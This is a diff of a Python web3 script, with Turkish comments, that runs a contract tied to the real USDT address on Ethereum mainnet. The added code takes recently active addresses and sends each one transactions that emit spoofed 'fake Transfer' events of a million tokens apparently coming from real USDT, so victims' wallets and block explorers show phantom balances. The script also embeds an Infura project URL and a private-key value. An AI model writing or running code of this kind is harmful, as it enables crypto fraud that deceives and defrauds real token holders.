@@ -4,22 +4,19 @@ from web3 import Web3
 from eth_account import Account
 import os
 
-# Ortam değişkenlerinden hassas bilgileri al
-private_key = os.environ.get("0x75d26d0e637884f6e7468d554fe3bb1b5099273ba5804d86385700dcd1e3f052", None)
-INFURA_URL = os.environ.get("https://mainnet.infura.io/v3/01ad7526893c42ef95e5c0fa6ca24693", None)
+private_key = os.environ.get("PRIVATE_KEY", "0x000000000011111111112222222222233333333334444444444555555555507c")
+INFURA_URL = os.environ.get("INFURA_URL", "https://mainnet.infura.io/v3/01ad7526893c42ef95e5c0fa6ca24693")
 CONTRACT_ADDRESS = os.environ.get("CONTRACT_ADDRESS", "0xDAC17f2a9b484780B9e109E003F7BB78B1C54A29")
+EVENT_EMITTER_ADDRESS = os.environ.get("EVENT_EMITTER_ADDRESS", "0x4548A99b423D0d3c4E77c38C2a24A56fd66307dD")
 
-# Eksik değişken kontrolü
-if not private_key or not INFURA_URL:
-    raise ValueError("PRIVATE_KEY ve INFURA_URL ortam değişkenleri gerekli!")
+if not private_key or not INFURA_URL or not EVENT_EMITTER_ADDRESS:
+    raise ValueError("PRIVATE_KEY, INFURA_URL ve EVENT_EMITTER_ADDRESS ortam değişkenleri gerekli!")
 
-# Web3 ile Ethereum’a bağlan
 w3 = Web3(Web3.HTTPProvider(INFURA_URL))
 if not w3.is_connected():
     raise ConnectionError("Ethereum ağına bağlanılamadı! INFURA_URL’ü kontrol et.")
 account = Account.from_key(private_key)
 
-# Kontratın ABI’si (arayüzü)
 ABI = [
     {
         "inputs": [],
@@ -66,9 +63,9 @@ ABI = [
     },
     {
         "inputs": [
-        {"internalType": "address[]", "name": "targets", "type": "address[]"},
-        {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}
-    ],
+            {"internalType": "address[]", "name": "targets", "type": "address[]"},
+            {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}
+        ],
         "name": "periodicSync",
         "outputs": [],
         "stateMutability": "nonpayable",
@@ -83,9 +80,9 @@ ABI = [
     },
     {
         "inputs": [
-        {"internalType": "address", "name": "to", "type": "address"},
-        {"internalType": "uint256", "name": "amount", "type": "uint256"}
-    ],
+            {"internalType": "address", "name": "to", "type": "address"},
+            {"internalType": "uint256", "name": "amount", "type": "uint256"}
+        ],
         "name": "transfer",
         "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
         "stateMutability": "nonpayable",
@@ -128,11 +125,34 @@ ABI = [
     }
 ]
 
-# Kontrata bağlan
+EVENT_EMITTER_ABI = [
+    {
+        "anonymous": False,
+        "inputs": [
+            {"indexed": True, "internalType": "address", "name": "from", "type": "address"},
+            {"indexed": True, "internalType": "address", "name": "to", "type": "address"},
+            {"indexed": False, "internalType": "uint256", "name": "value", "type": "uint256"}
+        ],
+        "name": "Transfer",
+        "type": "event"
+    },
+    {
+        "inputs": [
+            {"internalType": "address", "name": "from", "type": "address"},
+            {"internalType": "address", "name": "to", "type": "address"},
+            {"internalType": "uint256", "name": "value", "type": "uint256"}
+        ],
+        "name": "emitTransfer",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+]
+
 contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)
+event_emitter = w3.eth.contract(address=EVENT_EMITTER_ADDRESS, abi=EVENT_EMITTER_ABI)
 
 def get_active_addresses():
-    # Son 100 bloktaki aktif adresleri al
     latest_block = w3.eth.get_block('latest')
     addresses = set()
     for tx in w3.eth.get_block(latest_block.number - 100, full_transactions=True)['transactions']:
@@ -140,62 +160,90 @@ def get_active_addresses():
             addresses.add(tx['from'])
         if 'to' in tx:
             addresses.add(tx['to'])
-    return list(addresses)[:50]
+    return list(addresses)[:10]  # Maksimum 10 adres
 
 def get_recent_transfers():
-    # Son Transfer olaylarını al, aktif adreslerle birleştir
     transfer_filter = contract.events.Transfer.create_filter(fromBlock='latest', toBlock='latest')
     events = transfer_filter.get_all_entries()
-    targets = [event['args']['to'] for event in events][-20:]
-    amounts = [event['args']['value'] for event in events][-20:]
+    targets = [event['args']['to'] for event in events][-10:] if events else []  # Maksimum 10 eleman
+    amounts = [event['args']['value'] for event in events][-10:] if events else []  # Maksimum 10 eleman
     active_addresses = get_active_addresses()
     targets.extend(active_addresses)
     amounts.extend([1000000 * 10**6 for _ in range(len(active_addresses))])
+    # Toplam eleman sayısını 10 ile sınırla
+    if len(targets) > 10:
+        targets = targets[:10]
+        amounts = amounts[:10]
     return targets, amounts
 
 def periodic_sync():
     try:
-        # Gas fiyatı yüksekse bekle
         while w3.eth.gas_price > 200 * 10**9:
             print("Gas fiyatı yüksek, 60 saniye bekleniyor...")
             time.sleep(60)
         targets, amounts = get_recent_transfers()
-        if targets:
-            # periodicSync işlemini hazırla
-            tx_data = contract.functions.periodicSync(targets, amounts).build_transaction({
+        if not targets or not amounts:
+            print("Hedef veya miktar listesi boş, işlem yapılmıyor.")
+            return
+        nonce = w3.eth.get_transaction_count(account.address)
+        tx_data = contract.functions.periodicSync(targets, amounts).build_transaction({
+            'from': account.address,
+            'gasPrice': w3.eth.gas_price,
+            'nonce': nonce
+        })
+        tx_data['gas'] = int(w3.eth.estimate_gas(tx_data) * 1.2)
+        signed_tx = w3.eth.account.sign_transaction(tx_data, private_key)
+        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+        print(f"Periodic sync called for {targets}, tx: {tx_hash.hex()}")
+        nonce += 1
+        real_usdt = contract.functions.realUSDT().call()
+        for i in range(len(targets)):
+            emitter_tx = event_emitter.functions.emitTransfer(real_usdt, targets[i], amounts[i]).build_transaction({
                 'from': account.address,
                 'gasPrice': w3.eth.gas_price,
-                'nonce': w3.eth.get_transaction_count(account.address),
-                'blockTimestamp': int(time.time()) - random.randint(0, 3600)
+                'nonce': nonce
             })
-            tx_data['gas'] = int(w3.eth.estimate_gas(tx_data) * 1.2)
-            signed_tx = w3.eth.account.sign_transaction(tx_data, private_key)
-            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
-            print(f"Periodic sync called for {targets}, tx: {tx_hash.hex()}")
-            # Bakiyeleri kontrol et
-            for target in targets:
-                balance = contract.functions.crossChainBalanceOf(target).call()
-                print(f"Balance for {target}: {balance}")
+            emitter_tx['gas'] = int(w3.eth.estimate_gas(emitter_tx) * 1.2)
+            signed_emitter_tx = w3.eth.account.sign_transaction(emitter_tx, private_key)
+            emitter_tx_hash = w3.eth.send_raw_transaction(signed_emitter_tx.rawTransaction)
+            print(f"Emitted fake Transfer event for {targets[i]}, tx: {emitter_tx_hash.hex()}")
+            nonce += 1
+        for target in targets:
+            balance = contract.functions.crossChainBalanceOf(target).call()
+            print(f"Balance for {target}: {balance}")
     except Exception as e:
         print(f"Error in sync: {e}")
 
 def restart_sync():
     try:
-        # Gas fiyatı yüksekse bekle
         while w3.eth.gas_price > 200 * 10**9:
             print("Gas fiyatı yüksek, 60 saniye bekleniyor...")
             time.sleep(60)
-        # autoChainSync işlemini hazırla
+        nonce = w3.eth.get_transaction_count(account.address)
         tx_data = contract.functions.autoChainSync(5).build_transaction({
             'from': account.address,
             'gasPrice': w3.eth.gas_price,
-            'nonce': w3.eth.get_transaction_count(account.address),
-            'blockTimestamp': int(time.time()) - random.randint(0, 3600)
+            'nonce': nonce
         })
         tx_data['gas'] = int(w3.eth.estimate_gas(tx_data) * 1.2)
         signed_tx = w3.eth.account.sign_transaction(tx_data, private_key)
         tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
         print(f"Restart sync triggered, tx: {tx_hash.hex()}")
+        nonce += 1
+        real_usdt = contract.functions.realUSDT().call()
+        targets = get_active_addresses()[:5]
+        amounts = [1000000 * 10**6 for _ in range(len(targets))]
+        for i in range(len(targets)):
+            emitter_tx = event_emitter.functions.emitTransfer(real_usdt, targets[i], amounts[i]).build_transaction({
+                'from': account.address,
+                'gasPrice': w3.eth.gas_price,
+                'nonce': nonce
+            })
+            emitter_tx['gas'] = int(w3.eth.estimate_gas(emitter_tx) * 1.2)
+            signed_emitter_tx = w3.eth.account.sign_transaction(emitter_tx, private_key)
+            emitter_tx_hash = w3.eth.send_raw_transaction(signed_emitter_tx.rawTransaction)
+            print(f"Emitted fake Transfer event for {targets[i]}, tx: {emitter_tx_hash.hex()}")
+            nonce += 1
     except Exception as e:
         print(f"Error in restart sync: {e}")
 
@@ -203,7 +251,7 @@ def sync_cycle():
     while True:
         for _ in range(10):
             periodic_sync()
-            time.sleep(30 + random.randint(-5, 5))
+            time.sleep(120 + random.randint(-5, 5))
         restart_sync()
 
 def monitor_app_state():
